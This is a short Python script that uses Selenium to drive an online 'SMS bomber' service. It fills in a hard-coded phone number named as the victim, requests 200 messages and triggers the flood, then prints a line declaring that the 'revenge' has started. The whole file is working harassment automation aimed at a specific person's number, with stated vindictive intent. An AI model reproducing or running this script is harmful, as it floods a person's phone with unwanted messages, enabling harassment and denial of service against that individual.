
import time 
from selenium import webdriver
browser=webdriver.Edge(r'msedgedriver.exe')
#browser.get("https://google.com")





browser.get("https://mytoolstown.com/smsbomber/#bestsmsbomber")
number="7068591235"
#=browser.find_element(By.ID,'mobno')

victim_number=browser.find_element_by_id('mobno')
time.sleep(1)
victim_number.send_keys(number) #filling  victim number 
counter=browser.find_element_by_id('count')
counter.send_keys('200') 
time.sleep(5)
Bomb=browser.find_element_by_xpath('//*[@id="startsms"]')
Bomb.send_keys(u'\ue007') #Pressing Enter unicode Enter button 
print()
print("Bombing started , revenge started ")

